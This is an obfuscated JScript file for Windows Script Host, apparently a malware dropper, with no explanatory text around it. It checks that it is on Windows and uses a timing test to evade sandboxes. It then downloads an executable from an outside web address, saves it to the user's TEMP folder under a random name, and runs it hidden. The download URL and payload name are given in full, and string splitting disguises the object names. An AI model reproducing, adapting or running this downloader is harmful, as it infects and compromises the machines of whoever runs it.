var IW = false;
var P0 = "Create"+"Object";
var RH = function U() {return WScript[P0]("WScript"+".Shell");}(), IQ = 11;
var HZ = "MSXML2"+".XMLHTTP";
var UH = 2;
var P = UH - 2;
function SM(FD){RH["Run"](FD, P, P);};
function S(){return HZ + "";};
function I(BR, NM){P = P * 1; return BR - NM;};
function WF(){return P0;};
/*@cc_on
  @if (@_win32 || @_win64)
    IW = true;
  @end
@*/
if (IW)
{
var D = "";
function DX(){return 22;};
var II = 0; var W = 0;
function L()
{
var N = new this["Date"]();
var U0 = N["getUTCMilliseconds"]();
WScript["Sleep"](DX());
var N = new this["Date"]();
var LF = N["getUTCMilliseconds"]();
WScript["Sleep"](DX());
var N = new this["Date"]();
var PL = N["getUTCMilliseconds"]();
var II = "L0";
II = I(LF, U0);
var W = "E";
W = I(PL, LF);
D = "open";
return I(II, W);
}
var Z0 = false;
var LZ = false;
for (var AF = P; AF < DX() * 1; AF++){if (L() != P){
Z0 = true; 
W = "31" + 11 * II + W; 
LZ = true; 
break;
}}
function V() {return ((Z0 == true) && (Z0 == LZ)) ? 1 : P;};
if (Z0 && V() && LZ){
function ZG() {return RH["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "U8mcgH5LBga.ex" + "e";};
 UV = S();
 S0 = WScript[P0](UV);
 var Z = 1;
do { 
	for (;Z;){
	try {
		if (Z == 1)
		{
			S0[D]("GET", "http://epegasus.pl/m2osa", false);
			S0["send"]();
			CF = "Sleep";
			Z = 2;
		}
		WScript[CF](DX() + 120); 
		if (S0["readystate"] < 2 * 2) continue;
		Z = P;
		function NC(I0) {var YJ = (1, 2, 3, 4, 5, I0); return YJ;};
		N0 = WScript[WF()]("ADODB.Stream");
		UV = N0;
		UV[D]();
		UV["type"] = NC(1);
		UV["write"](S0["ResponseBody"]);
		N0["position"] = NC(P);
		UV["Save" + "ToFile"](ZG(), 2);
		N0["cl"+"ose"]();
		O = ZG();
		SM(O);
	} catch(W0){};};
}while (Z);
}
}

